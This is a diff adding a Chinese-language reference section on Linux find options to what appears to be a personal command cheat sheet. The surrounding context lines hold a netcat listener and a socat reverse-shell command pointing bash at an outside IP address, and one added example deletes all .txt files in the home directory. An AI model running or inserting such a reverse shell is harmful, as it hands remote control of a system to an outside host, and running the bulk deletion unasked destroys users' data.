@@ -1290,6 +1290,63 @@ nc -lvvp 123
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:175.24.115.4:123
 
 
+--------------------------------------------------------------------------------------------------------------------
+find命令
+
+查找文件名
+1、find . name　
+
+查找前n天之前访问过的文件/前n天之后　　　															
+2、-atime +n/-n　　
+
+显示带有文件名的所有文件及路径　　															
+3、fing / 文件名*　　　
+
+查找home下的txt文件（忽略大小写）　														
+4、find  /home -（i）name "*.txt"  
+
+匹配正则 表达式　　　　										
+5、find  .  -regex  ".\(\.txt\|\.pdf\)$"  
+
+类型参数   ### f是普通文件，l是链接文件，d是目录文件，c是字符设备文件，b是块设备文件，s是套接字文件，p是管道文件　　　　								
+6、find  .  -type  　　　
+
+找出7天内被访问过的文件　											
+7、find  .  -type  f  -atime  -7　
+
+找出恰好是7天前那一天访问过的文件　　　
+8、find  .  -type  f  -atime  7　
+
+找出超过7天前修改过的文件　　　
+9、find . -type f -mtime +7　
+
+b—块（512字节），c—字节，w—字（2字节），k—千字节，M—兆字节，G—吉字节　　　
+10、find  .  -type  f  -size  文件大小　　
+
+搜索大于10k的文件　　
+11、find  .  -type  f  -size  +10k　　　
+
+搜索小于10k的文件　
+12、find  .  -type  f  -size  -10k　
+
+搜索等于10k的文件　　　
+13、find  .  -type  f  -size  10k　　
+
+搜索当前目录下权限为777的文件　　
+14、find  .  -type  f  -perm  777　　　
+
+找出目录下权限不是644的php文件　
+15、find  .  -type  f  -name  "*.php"  !  -perm  644　　
+
+找出当前目录下用户tom所拥有的文件　　
+16、find . -type f -user tom　　　
+
+找出自己家目录下所有.txt文件并删除　
+17、find  $HOME/.  -name  "*.txt"  -exec  rm  {}  \; 　　
+
+将30天前修改的.log文件拷贝到old目录下　　
+18、find  .  -type  f  -mtime  +30  -name  “*.log”  -exec  cp  {}  old  \;　　
+--------------------------------------------------------------------------------------------------------------------
 
 sed命令使用：
 
